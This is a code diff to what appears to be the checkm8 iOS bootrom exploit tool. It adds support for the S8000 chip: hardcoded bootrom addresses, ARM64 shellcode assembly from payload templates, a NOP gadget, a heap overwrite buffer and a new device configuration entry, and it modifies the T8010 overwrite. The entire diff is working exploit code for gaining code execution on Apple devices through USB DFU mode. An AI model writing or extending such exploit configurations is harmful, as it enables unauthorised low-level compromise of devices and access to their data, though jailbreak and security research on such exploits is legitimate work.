@@ -235,6 +235,30 @@ def payload(cpid):
     assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
     return s5l8960x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler
+  if cpid == 0x8000:
+    constants_usb_s8000 = [
+               0x180380000, # 1 - LOAD_ADDRESS
+        0x6578656365786563, # 2 - EXEC_MAGIC
+        0x646F6E65646F6E65, # 3 - DONE_MAGIC
+        0x6D656D636D656D63, # 4 - MEMC_MAGIC
+        0x6D656D736D656D73, # 5 - MEMS_MAGIC
+               0x10000EE78, # 6 - USB_CORE_DO_IO
+    ]
+    constants_checkm8_s8000 = [
+               0x1800877E0, # 1 - gUSBDescriptors
+               0x180087950, # 2 - gUSBSerialNumber
+               0x10000E354, # 3 - usb_create_string_descriptor
+               0x1800807DA, # 4 - gUSBSRNMStringDescriptor
+               0x1800878F8, # 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
+        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
+               0x18037FC00, # 8 - PAYLOAD_PTR
+    ]
+    s8000_handler   = asm_arm64_x7_trampoline(0x10000F1B0) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s8000)[4:]
+    s8000_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s8000)
+    assert len(s8000_shellcode) <= PAYLOAD_OFFSET_ARM64
+    assert len(s8000_handler) <= PAYLOAD_SIZE_ARM64
+    return s8000_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s8000_shellcode)) + s8000_handler
   if cpid == 0x8002:
     constants_usb_t8002 = [
                 0x48818000, # 1 - LOAD_ADDRESS
@@ -424,6 +448,7 @@ def payload(cpid):
     return struct.pack('<6Q16x448s1536x1024s', 0x180020400-8, 0x1000006A5, 0x180020600-8, 0x180000625, 0x18000C600-8, 0x180000625, t8015_callback_data, t8015_shellcode)
 
 def all_exploit_configs():
+  s8000_nop_gadget = 0x10000DE34
   t8010_nop_gadget = 0x10000CC6C
   t8011_nop_gadget = 0x10000CD0C
   t8015_nop_gadget = 0x10000A9C4
@@ -432,7 +457,8 @@ def all_exploit_configs():
   s5l895xx_overwrite = '\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
   t800x_overwrite    = '\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
   s5l8960x_overwrite = '\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
-  t8010_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  s8000_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q',             s8000_nop_gadget, 0x180380000)
+  t8010_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q',             t8010_nop_gadget, 0x1800B0800)
   t8011_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
   t8015_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
@@ -441,6 +467,7 @@ def all_exploit_configs():
     DeviceConfig('iBoot-1145.3'  ,        0x8950,  659, s5l895xx_overwrite, None, None), # S5L8950 (buttons)      2.30 seconds
     DeviceConfig('iBoot-1145.3.3',        0x8955,  659, s5l895xx_overwrite, None, None), # S5L8955 (buttons)      2.30 seconds
     DeviceConfig('iBoot-1704.10',         0x8960, 7936, s5l8960x_overwrite, None, None), # S5L8960 (buttons)     13.97 seconds
+    DeviceConfig('iBoot-2234.0.0.3.3',    0x8000, None,    s8000_overwrite,    5,    1),
     DeviceConfig('iBoot-2651.0.0.1.31',   0x8002, None,    t800x_overwrite,    5,    1), # T8002 (DFU loop)  NEW: 1.27 seconds
     DeviceConfig('iBoot-2651.0.0.3.3',    0x8004, None,    t800x_overwrite,    5,    1), # T8004 (buttons)   NEW: 1.06 seconds
     DeviceConfig('iBoot-2696.0.0.1.33',   0x8010, None,    t8010_overwrite,    5,    1), # T8010 (buttons)   NEW: 0.68 seconds
